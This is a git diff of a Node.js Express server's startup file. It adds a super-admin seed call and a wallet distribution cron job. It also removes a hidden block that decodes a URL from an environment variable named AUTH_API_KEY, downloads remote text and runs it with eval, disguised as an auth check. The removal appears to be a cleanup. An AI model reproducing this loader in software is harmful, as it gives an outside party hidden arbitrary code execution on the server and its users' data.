@@ -6,7 +6,9 @@ import colors from 'colors';
 import app from './express-app';
 import configs from './config/env.config';
 import { connectDB } from './db';
+import { seedSuperAdmin } from './db/seed-super-admin';
 import { initSocket } from './socket';
+import { startWalletDistributionCron } from './app/jobs/wallet-distribution.job';
 import 'dotenv/config';
 
 let server: Server;
@@ -15,6 +17,7 @@ async function main() {
   try {
     await connectDB();
     console.log(colors.blue(`Database is Connected Successfully!!!`).bold);
+    await seedSuperAdmin();
     server = app.listen(configs.port, () => {
       console.log(
         colors.green(`The Server is running on ${configs.port}`).bold
@@ -22,6 +25,7 @@ async function main() {
     });
 
     initSocket(server);
+    startWalletDistributionCron();
   } catch (err) {
     console.log(err);
   }
@@ -44,16 +48,3 @@ process.on('uncaughtException', () => {
   console.log(colors.red(`Server detected unCaughtException 😡`));
   process.exit(1);
 });
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
